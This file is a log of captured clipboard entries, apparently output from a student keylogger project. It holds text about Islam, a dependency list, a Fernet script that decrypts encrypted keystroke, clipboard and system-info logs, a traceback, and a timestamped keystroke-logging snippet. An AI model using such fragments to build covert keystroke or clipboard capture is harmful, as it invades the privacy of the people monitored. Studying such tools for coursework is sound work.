@@ -1,0 +1,132 @@
+Clipboard Data: 
+Muslims believe that Islam is the complete and universal version of a primordial faith that was revealed many times through earlier prophets, including Adam, Noah, Abraham, Moses and Jesus. Muslims consider the Quran to be the verbatim word of God and the unaltered final revelation. Alongside the Quran, Muslims also believe in previous revelations, such as the Tawrat (the Torah), the Zabur (Psalms), and the Injeel (Gospel). 
+Clipboard Data: 
+The religion of Islam originated in Mecca about 610 CE.
+Clipboard Data: 
+The religion of Islam originated in Mecca about 610 CE.
+Clipboard Data: 
+The two main Islamic branches are Sunni Islam (85�90%) and Shia Islam (10�15%). While the Shia�Sunni divide initially arose from disagreements over the succession to Muhammad, they grew to cover a broader dimension, both theologically and juridically.
+Clipboard Data: 
+The two main Islamic branches are Sunni Islam (85�90%) and Shia Islam (10�15%). While the Shia�Sunni divide initially arose from disagreements over the succession to Muhammad, they grew to cover a broader dimension, both theologically and juridically.
+
+Clipboard Data: 
+The two main Islamic branches are Sunni Islam (85�90%) and Shia Islam (10�15%). While the Shia�Sunni divide initially arose from disagreements over the succession to Muhammad, they grew to cover a broader dimension, both theologically and juridically.
+
+Clipboard Data: 
+The Islamic creed (aqidah) requires belief in six articles: God, angels, revelation, prophets, the Day of Resurrection, and the divine predestination.
+
+Clipboard Data: 
+pip install
+pywin32
+pynput
+scipy
+cryptography
+requests
+pillow
+
+Clipboard Data: 
+system_information_e = 'e_systeminfo.txt'
+clipboard_information_e = 'e_clipboard.txt'
+keys_information_e = 'e_key_log.txt'
+
+decrypted_files = [
+    'd_systeminfo.txt',
+    'd_clipboard.txt',
+    'd_key_log.txt'
+]
+
+encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
+count = 0
+
+for encrypted_file, decrypted_file in zip(encrypted_files, decrypted_files):
+    with open(encrypted_file, 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(key)
+    try:
+        decrypted = fernet.decrypt(data)
+        decoded_text = decrypted.decode('utf-8')
+    except Exception as e:
+        print(f"Error decoding {encrypted_file}: {e}")
+        continue
+
+    with open(decrypted_file, 'a') as f:
+        f.write(decoded_text)
+
+    count += 1
+
+Clipboard Data: 
+system_information_e = 'e_systeminfo.txt'
+clipboard_information_e = 'e_clipboard.txt'
+keys_information_e = 'e_key_log.txt'
+
+decrypted_files = [
+    'd_systeminfo.txt',
+    'd_clipboard.txt',
+    'd_key_log.txt'
+]
+
+encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
+count = 0
+
+for encrypted_file, decrypted_file in zip(encrypted_files, decrypted_files):
+    with open(encrypted_file, 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(key)
+    try:
+        decrypted = fernet.decrypt(data)
+        decoded_text = decrypted.decode('utf-8')
+    except Exception as e:
+        print(f"Error decoding {encrypted_file}: {e}")
+        continue
+
+    with open(decrypted_file, 'a') as f:
+        f.write(decoded_text)
+
+    count += 1
+
+Clipboard Data: 
+[Running] python -u "c:\Users\User\Documents\IIUC\7th_Computer_Security\Final_Project\Cryptography\DecryptFile.py"
+Traceback (most recent call last):
+  File "c:\Users\User\Documents\IIUC\7th_Computer_Security\Final_Project\Cryptography\DecryptFile.py", line 17, in <module>
+    with open(encrypted_files[count], 'rb') as f:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+FileNotFoundError: [Errno 2] No such file or directory: 'C:\\Users\\User\\Documents\\IIUC\\7th_Computer_Security\\Final_Project\\Cryptography\\e_system.txt'
+
+[Done] exited with code=1 in 0.102 seconds
+
+
+Clipboard Data: 
+system_information_e = 'e_system.txt'
+clipboard_information_e = 'e_clipboard.txt'
+keys_information_e = 'e_keys_logged.txt'
+
+Clipboard Data: 
+"e_clipboard.txt"
+
+Clipboard Data: 
+# Include the timestamp in the log entry
+                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+                    log_entry = f"{timestamp}: {k}\n"
+                    f.write(log_entry)
+
+Clipboard Data: 
+Final_Project/
+|-- keylogger/
+|   |-- __init__.py
+|   |-- keylogger.py
+|
+|-- DecryptFile.py
+
+Clipboard Data: 
+Final_Project/
+|-- keylogger/
+|   |-- __init__.py
+|   |-- keylogger.py
+|
+|-- DecryptFile.py
+
+Clipboard Data: 
+|-- DecryptFile.py
+
